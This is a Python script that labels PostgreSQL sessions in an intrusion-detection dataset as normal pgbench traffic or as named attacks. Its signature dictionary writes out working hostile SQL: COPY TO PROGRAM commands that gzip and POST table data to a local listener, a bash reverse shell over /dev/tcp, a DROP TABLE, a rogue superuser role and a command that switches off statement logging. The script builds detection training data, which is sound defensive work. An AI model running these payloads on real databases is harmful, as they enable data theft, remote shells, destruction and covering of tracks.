#!/usr/bin/env python3
"""
generate_labels.py — Marker-window-based session labeler for CASCE datasets.

Labels each PostgreSQL session_id by checking whether the session's first event
timestamp falls within an ATTACK_START/ATTACK_END marker window emitted by the
attack scripts via logger.sh mark_attack. Sessions outside all attack windows
are labeled "Normal".

Includes a self-check assertion: any session whose *every* query is a standard
pgbench TPC-B query must be labeled "Normal", otherwise the build fails.
"""
import json
import csv
import sys
import re

# ── Attack name → human-readable label mapping ──────────────────────────
ATTACK_LABELS = {
    "attack_exfiltration":              "Data Exfiltration",
    "attack_exfiltration_delayed_2s":   "Data Exfiltration",
    "attack_exfiltration_delayed_30s":  "Data Exfiltration",
    "attack_exfiltration_alt_process":  "Data Exfiltration",
    "attack_sabotage":                  "Sabotage",
    "attack_privilege_abuse":           "Privilege Abuse",
    "attack_reverse_shell":             "Reverse Shell",
    "attack_os_priv_escalation":        "OS Privilege Escalation",
    "attack_db_unauthorized_read":      "Unauthorized DB Read",
    "attack_multi_stage_apt":           "Multi-Stage APT",
}

# ── pgbench TPC-B query patterns (normalized, case-insensitive) ─────────
# These are the only queries pgbench's default -b tpcb-like generates.
PGBENCH_PATTERNS = [
    re.compile(r"^\s*BEGIN\s*;?\s*$", re.IGNORECASE),
    re.compile(r"^\s*END\s*;?\s*$", re.IGNORECASE),
    re.compile(r"^\s*UPDATE\s+pgbench_accounts\s+SET\s+abalance\s*=", re.IGNORECASE),
    re.compile(r"^\s*SELECT\s+abalance\s+FROM\s+pgbench_accounts\s+WHERE", re.IGNORECASE),
    re.compile(r"^\s*UPDATE\s+pgbench_tellers\s+SET\s+tbalance\s*=\s*tbalance\s*\+", re.IGNORECASE),
    re.compile(r"^\s*UPDATE\s+pgbench_branches\s+SET\s+bbalance\s*=\s*bbalance\s*\+", re.IGNORECASE),
    re.compile(r"^\s*INSERT\s+INTO\s+pgbench_history\s*\(", re.IGNORECASE),
]


def _is_pgbench_query(query: str) -> bool:
    """Return True if this query matches a standard pgbench TPC-B statement."""
    return any(pat.search(query) for pat in PGBENCH_PATTERNS)


def generate_labels():
    print("Generating labels from postgres_events.json (marker-window method)...")

    events_path = "/dataset_workspace/postgres_events.json"

    # ── Pass 1: extract attack windows from markers ──────────────────
    attack_windows = []          # [(attack_name, start_ts, end_ts)]
    pending_starts = {}          # attack_name -> start_ts

    # Also collect per-session info for Pass 2
    session_first_ts = {}        # session_id -> first_timestamp
    session_queries = {}         # session_id -> [query, ...]

    try:
        with open(events_path, "r") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    event = json.loads(line)
                except json.JSONDecodeError:
                    continue

                # Handle markers
                if "marker" in event:
                    marker = event["marker"]
                    ts = float(event.get("timestamp", 0))
                    attack_name = event.get("attack_name", "")

                    if marker == "ATTACK_START" and attack_name:
                        pending_starts[attack_name] = ts
                    elif marker == "ATTACK_END" and attack_name:
                        start_ts = pending_starts.pop(attack_name, None)
                        if start_ts is not None:
                            attack_windows.append((attack_name, start_ts, ts))
                    continue

                # Regular event — track session info
                session_id = event.get("session_id")
                if session_id is None:
                    continue
                ts = float(event.get("timestamp", 0))
                query = event.get("query", "")

                if session_id not in session_first_ts or ts < session_first_ts[session_id]:
                    session_first_ts[session_id] = ts

                if session_id not in session_queries:
                    session_queries[session_id] = []
                session_queries[session_id].append(query)

    except FileNotFoundError:
        print("postgres_events.json not found! Ensure Phase 3 & 4 ran successfully.")
        return

    print(f"  Found {len(attack_windows)} attack windows from markers.")
    print(f"  Found {len(session_first_ts)} unique sessions.")

    # ── Exact Attack Query Signatures ────────────────────────────────
    # We require at least one query in the session to exactly match (or parameterized match)
    # the known attack payload for that specific attack window. This prevents concurrent
    # normal sessions (like pgbench) from being mislabeled if they start during a window.
    ATTACK_QUERIES = {
        "attack_exfiltration": [
            "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'gzip > /tmp/accounts_exfil.gz && curl -s -X POST -d @/tmp/accounts_exfil.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';"
        ],
        "attack_exfiltration_delayed_2s": [
            "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'sleep 2 && gzip > /tmp/accounts_exfil_b.gz && curl -s -X POST -d @/tmp/accounts_exfil_b.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';"
        ],
        "attack_exfiltration_delayed_30s": [
            "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'sleep 30 && gzip > /tmp/accounts_exfil_c.gz && curl -s -X POST -d @/tmp/accounts_exfil_c.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';"
        ],
        "attack_exfiltration_alt_process": [
            "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'python3 -c \"import urllib.request, sys; req = urllib.request.Request(\\\"http://127.0.0.1:9090\\\", data=sys.stdin.read().encode(), method=\\\"POST\\\"); urllib.request.urlopen(req)\" > /dev/null 2>&1 || true';"
        ],
        "attack_sabotage": [
            "DROP TABLE IF EXISTS pgbench_history CASCADE;"
        ],
        "attack_privilege_abuse": [
            "CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'hacked';",
            "SELECT set_config('log_statement', 'none', false);",
            "UPDATE pgbench_tellers SET tbalance = 99999 WHERE tid = 1;"
        ],
        "attack_reverse_shell": [
            "COPY (SELECT 1) TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &\" || true';"
        ],
        "attack_db_unauthorized_read": [
            "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;"
        ],
        "attack_multi_stage_apt": [
            "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
            "CREATE ROLE apt_hacker SUPERUSER LOGIN PASSWORD 'apt_pass';",
            "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';"
        ]
        # attack_os_priv_escalation is omitted because it has no DB queries
    }

    # ── Pass 2: label each session ───────────────────────────────────
    labels = {}
    for session_id, first_ts in session_first_ts.items():
        label = "Normal"
        session_qs = session_queries.get(session_id, [])
        for attack_name, win_start, win_end in attack_windows:
            if int(win_start) <= first_ts <= int(win_end):
                # Also verify the session actually executed the attack query
                expected_queries = ATTACK_QUERIES.get(attack_name, [])
                # If expected_queries is empty, it means this attack (like OS priv escalation)
                # does not create any PG sessions. We shouldn't label any PG session with it.
                if expected_queries and any(eq in sq for sq in session_qs for eq in expected_queries):
                    label = ATTACK_LABELS.get(attack_name, f"Unknown({attack_name})")
                    break
        labels[session_id] = label

    # ── Self-check: no pgbench-only session should be non-Normal ─────
    pgbench_violations = []
    for session_id, queries in session_queries.items():
        if all(_is_pgbench_query(q) for q in queries):
            # This is a pure pgbench session
            if labels.get(session_id, "Normal") != "Normal":
                pgbench_violations.append((session_id, labels[session_id]))

    if pgbench_violations:
        print("\n!!! SELF-CHECK FAILED: pgbench-only sessions received non-Normal labels !!!")
        for sid, lbl in pgbench_violations:
            print(f"  session_id={sid} mislabeled as '{lbl}'")
        print(f"\n{len(pgbench_violations)} pgbench session(s) mislabeled. BUILD FAILED.")
        sys.exit(1)
    else:
        print("  Self-check PASSED: zero pgbench-only sessions mislabeled.")

    # ── Write labels.csv ─────────────────────────────────────────────
    with open("/dataset_workspace/labels.csv", "w", newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["session_id", "label"])
        for sid, label in sorted(labels.items(), key=lambda x: str(x[0])):
            writer.writerow([sid, label])

    # ── Print distribution ───────────────────────────────────────────
    dist = {}
    for label in labels.values():
        dist[label] = dist.get(label, 0) + 1
    print(f"\nGenerated labels.csv for {len(labels)} unique sessions.")
    print("Label distribution:")
    for lbl, count in sorted(dist.items(), key=lambda x: -x[1]):
        print(f"  {lbl}: {count}")


if __name__ == '__main__':
    generate_labels()
